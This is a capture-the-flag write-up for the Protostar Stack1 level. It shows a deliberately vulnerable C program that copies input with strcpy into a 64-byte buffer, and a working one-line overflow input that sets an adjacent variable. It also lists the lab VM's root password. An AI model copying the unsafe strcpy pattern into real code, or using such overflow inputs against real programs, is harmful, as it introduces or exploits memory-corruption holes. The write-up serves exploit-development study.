# Protostar - Stack1
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack1__
* About
  
  This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

  This level is at /opt/protostar/bin/stack1

  Hints
  * If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
  * Protostar is little endian


* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}

```

  This is similar to Stack0 but we have to overflow the "modified" variable with specific value, 0x61626364. The value 0x61626364 are in HEX but we must convert them to ASCII and put them follow 64 "A"s. 
  * 0x61 0x62 0x63 0x64 = a d c b

  We will input 64 "A" and then "dcba" because it is little endian that means everything we put into the stack, it will be reverse order. In little endian, you store the least significant byte in the smallest address.
```
user@protostar:~$ /opt/protostar/bin/stack1 $(python -c 'print("A"*64 + "dcba")')
you have correctly got the variable to the right value
```

### _Solution_
```
user@protostar:~$ /opt/protostar/bin/stack1 $(python -c 'print("A"*64 + "dcba")')
you have correctly got the variable to the right value
```